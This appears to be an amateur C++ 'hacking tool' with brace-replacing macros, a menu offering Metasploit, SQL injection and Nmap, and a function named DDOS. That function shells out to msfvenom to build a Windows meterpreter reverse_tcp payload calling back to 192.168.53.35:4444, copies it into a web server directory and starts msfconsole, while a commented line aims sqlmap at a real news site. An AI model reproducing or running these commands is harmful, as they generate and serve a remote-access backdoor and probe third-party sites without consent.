
#include<bits/stdc++.h>
#define ll long long
#define do {
#define done }
#define start_ int main()
#define finish return 0;
using namespace std;

void loop1()
do
     for(ll row=1;row<=5;row++)
     do
          for(ll col=1;col<=row;col++)
          do
                cout<<"SAJIB";
          done
          cout<<"\n";
     done
done

void crack1()
do
     //system("firefox youtube.com");
done

void ExistingTools()
do
      cout<<"Enter the Attack you want to perform"<<endl;
      cout<<"1): METASPLOIT "<<endl;
      cout<<"2): SQL INJECTION "<<endl;
      cout<<"3): NMAP "<<endl;
      cout<<"Select  an Option"<<endl;
      ll opt;cin>>opt;
      if(opt==1)
        do
            cout<<"OPENNING THE METASPLOIT FRAMEWORK"<<endl;
            system("msfconsole");
        done
      else if(opt==2)
        do
            cout<<"PERFORMMING THE SQL-INJECTION ATTACK"<<endl;
            //string url;
            //cin>>url;
           //system ("sqlmap -u  /c \"url\"");
        done
     //system("msfconsole");
done

void PasswordGenerator()
do
       FILE *file;
       file=fopen("hack.txt","w");
       while(1)
        do
             char s[100005];
             scanf("%s",s);
             ll len=strlen(s);
             if(len==1)
                break;
             fprintf(file,"%s\n",s);
        done

done

void DDOS()
do
      char str[100005];
      char str2[100005];
      char str3[100005];
      char str4[100005];
      char str5[100005];
      char str6[100005];
      char str7[100005];
      strcpy(str2,"ping -c 5 192.168.53.35");
      strcpy(str3,"firefox 192.168.1.103/payload.exe");
      strcpy(str4,"msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.53.35 LPORT=4444 -f exe -o payload.exe");
      strcpy(str5,"sudo cp payload.exe /srv/http");
      strcpy(str6,"msfconsole");
      strcpy(str7,"ls -la");
      //strcpy( str, "sqlmap -u https://dailypakistan.com.pk/");
      //system(str);
      system(str2);
      system(str3);
      system(str4);
      system(str5);
      system(str6);
      system(str7);

done

start_
do



loop1();
//ExistingTools();
//PasswordGenerator();
DDOS();
finish
done

